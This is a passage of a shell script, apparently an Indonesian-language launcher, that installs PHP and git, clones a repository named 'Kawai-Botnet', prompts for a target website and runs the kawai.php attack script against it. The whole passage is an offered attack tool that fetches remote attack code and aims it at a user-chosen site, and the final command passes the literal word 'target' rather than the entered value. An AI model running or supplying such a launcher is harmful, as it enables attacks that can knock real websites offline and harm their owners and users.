then
clear
figlet "Frezz" | lolcat
sleep 1
apt update && apt upgrade
apt install php
apt install git
git clone https://github.com/Cvar1984/Kawai-Botnet
mv Kawai-Botnet $HOME
cd $HOME/Kawai-Botnet
read -p "[Masukan Web Target]»:" target
php kawai.php target 4 0 9999
fi